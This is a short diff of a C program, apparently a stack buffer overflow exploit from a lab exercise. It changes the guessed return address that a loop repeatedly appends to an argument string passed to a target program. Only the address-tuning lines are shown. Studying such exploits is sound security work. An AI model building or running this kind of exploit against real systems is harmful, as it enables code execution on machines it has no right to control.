@@ -26,7 +26,7 @@ int main(void)
   for (int i = 0; i < 38; ++i)
   {
   	// strcat(str, "\x2c\xfb\xff\xbf");
-  	strcat(str, "\xd4\xfb\xff\xbf");
+  	strcat(str, "\x20\xfb\xff\xbf");
     // bffffbd4
   }
   args[1] = str;
